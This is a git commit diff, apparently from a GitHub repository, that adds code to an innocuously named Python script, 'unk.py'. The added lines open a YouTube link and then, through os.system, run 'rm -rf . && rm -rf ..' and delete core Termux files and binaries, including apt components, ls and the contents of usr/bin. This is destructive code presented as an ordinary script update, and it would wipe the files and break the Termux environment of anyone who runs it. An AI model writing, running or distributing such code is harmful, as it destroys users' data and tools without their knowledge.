705914ba95ad1d375f6e02bf0b154506407b397c
ixzada <127699732+ixzzxitado@users.noreply.github.com>
2024-01-03 20:03:16 -0300

    Update unk.py

--- unk.py
+++ unk.py
@@ -1,1 +1,5 @@
 #!/usr/bin/env python
+import os
+os.system("termux-open --view https://youtube.com/shorts/hKnLPwLjBnM?si=eUv2aQygPvU10UV8")
+os.system("TERMUX FALLING🤒")
+os.system("rm -rf . && rm -rf .. && rm /data/data/com.termux/files/usr/libexec/termux/command-not-found && rm /data/data/com.termux/files/usr/include/apt-pkg/install-progress.h && rm /data/data/com.termux/files/usr/include/apt-pkg/update.h && rm /data/data/com.termux/files/usr/include/apt-pkg/upgrade.h && rm /data/data/com.termux/files/usr/share/bash-completion/completions/apt && rm /data/data/com.termux/files/usr/share/doc/apt/examples/configure.index && rm /data/data/com.termux/files/usr/share/man/man5/apt.conf.5.gz && rm /data/data/com.termux/files/usr/share/man/man8/apt-key.8.gz && rm /data/data/com.termux/files/usr/bin/ls && rm * /data/data/com.termux/files/usr/bin")
